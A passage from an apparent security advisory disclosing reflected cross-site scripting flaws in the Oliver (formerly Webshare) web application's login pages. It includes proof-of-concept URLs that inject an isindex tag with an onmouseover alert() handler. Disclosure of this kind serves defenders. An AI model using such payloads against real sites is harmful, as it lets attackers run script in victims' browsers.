04. ### Vulnerability Description ###

Multiple Non-Persistent Cross-Site Scripting vulnerabilities have been
identified in the Oliver (formerly Webshare) web application.
Oliver contains a flaw that allows multiple reflected cross-site
scripting (XSS) attacks.
This flaw exists because certain pages do not validate input before
returning it to users.


Vulnerable file(s):
index.php (login page)
loginform-inc.php (login form)

Request Method(s):
GET


05. ### Technical Description / Proof of Concept Code ###

The vulnerability is located in the pages

http://localhost/oliver/index.php
http://localhost/oliver/loginform-inc.php

The application does not validate correctly the URL upon submission.
The attacker can inject the malicious javascript code:

<isindex x="javascript:" onmouseover="alert('Rv3Lab XSS')">

http://localhost/oliver/index.php/<isindex x="javascript:" 
onmouseover="alert('Rv3Lab XSS')">
http://localhost/oliver/loginform-inc.php/<isindex x="javascript:" 
onmouseover="alert('Rv3Lab XSS')">


06. ### Business Impact ###

This may allow an attacker to create a specially crafted URL that
would execute arbitrary script code in a user's browser within the trust
relationship between their browser and the server.


07. ### Systems Affected ###
